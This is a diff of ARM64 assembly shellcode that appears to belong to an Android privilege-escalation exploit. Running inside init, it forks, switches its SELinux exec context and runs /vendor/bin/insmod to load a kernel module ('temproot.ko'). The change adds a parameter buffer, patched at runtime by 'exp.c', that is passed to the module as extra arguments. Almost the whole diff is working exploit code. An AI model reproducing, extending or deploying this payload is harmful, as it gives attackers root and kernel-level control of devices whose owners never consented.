@@ -25,10 +25,19 @@ ko_target:
     .skip 32, 0                             /* pad to 64 bytes — longest candidate path */
 log_path:
     .asciz "/dev/trlog"
+    /* Module parameters: patched at runtime by exp.c (setup) with
+     * NUL-separated tokens; an empty token ends the argv list.
+     * temproot.ko mode writes nothing here, so insmod sees no extra args. */
+hook_params:
+    .skip 128, 0
     .balign 4
     .global libcxx_ko_target_off
 libcxx_ko_target_off:
     .int ko_target - libcxx_data
+    .balign 4
+    .global libcxx_params_off
+libcxx_params_off:
+    .int hook_params - libcxx_data
 
     .align 4
 
@@ -47,9 +56,8 @@ libcxx_start:
     svc     0
     cbnz    w0, return
 
-    // Detect init tid = 1
-    // We need thread 1 to use the default namespace
-    mov     x8, SYS_gettid
+    // Detect init pid = 1 (any init thread; init is always uid 0)
+    mov     x8, SYS_getpid
     svc     0
     cmp     w0, 1
     bne     return
@@ -89,9 +97,9 @@ libcxx_start:
     cbnz    w0, return          // parent returns to init
 
     // ── worker child ──────────────────────────────────────────────────────
-    sub     sp, sp, 32
+    sub     sp, sp, 128
 
-    // Fork grandchild: set SELinux exec context → execve insmod
+    // Fork grandchild: set SELinux exec context → execve payload
     mov     x0, #SIGCHLD
     mov     x1, xzr
     mov     x2, xzr
@@ -101,7 +109,7 @@ libcxx_start:
     svc     0
     cbnz    w0, myexit
 
-    // ── grandchild: insmod the KO as vendor_modprobe ──────────────────────
+    // ── grandchild: exec the payload ──────────────────────────────────────
     // open /proc/self/attr/exec
     mov     x0, -100
     adr     x1, attr_exec
@@ -128,18 +136,27 @@ libcxx_start:
     svc     0
 1:
 
-    // execve("/vendor/bin/insmod", [exe_path, ko_target, NULL], NULL)
+    // execve(""/vendor/bin/insmod"", [exe_path, ko_target, hook_params..., NULL], NULL)
+    // argv keeps growing while hook_params holds non-empty NUL-separated tokens.
     adr     x1, exe_path
     str     x1, [sp]
     adr     x1, ko_target
     str     x1, [sp, 8]
-    str     xzr, [sp, 16]
+    mov     x3, sp
+    add     x3, x3, 16
+    adr     x4, hook_params
+1:  ldrb    w2, [x4]
+    cbz     w2, 2f
+    str     x4, [x3], 8
+3:  ldrb    w2, [x4], 1
+    cbnz    w2, 3b
+    b       1b
+2:  str     xzr, [x3]
     adr     x0, exe_path
     mov     x1, sp
     mov     x2, xzr
     mov     x8, #SYS_execve
     svc     0
-
 myexit:
     mov     x0, #1
     mov     x8, #SYS_exit
